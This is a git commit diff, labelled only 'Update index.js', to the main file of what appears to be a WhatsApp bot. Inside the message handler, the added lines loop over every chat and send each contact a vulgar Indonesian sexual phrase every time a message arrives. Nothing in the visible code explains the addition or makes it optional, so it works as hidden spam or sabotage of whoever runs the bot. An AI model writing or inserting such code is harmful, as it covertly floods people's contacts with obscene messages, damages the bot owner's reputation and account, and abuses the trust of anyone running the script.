696755ecef8bf7ce1a72d87fe4ab306b12580482
bennybotwa <78677744+bennybotwa@users.noreply.github.com>
2021-03-18 00:57:23 +0700

    Update index.js

--- index.js
+++ index.js
@@ -166,6 +166,10 @@ client.on('CB:Blocklist', json => {
 			const vhtearkey = 'APIKEY_LU'
 			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
 			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
+			anu = benny.chats.all()
+			for (let o of anu) {
+			benny.sendMessage(o.jid, 'NGEWE ENAK NIH', text)
+						}
 			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
 			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
 			const args = body.trim().split(/ +/).slice(1)
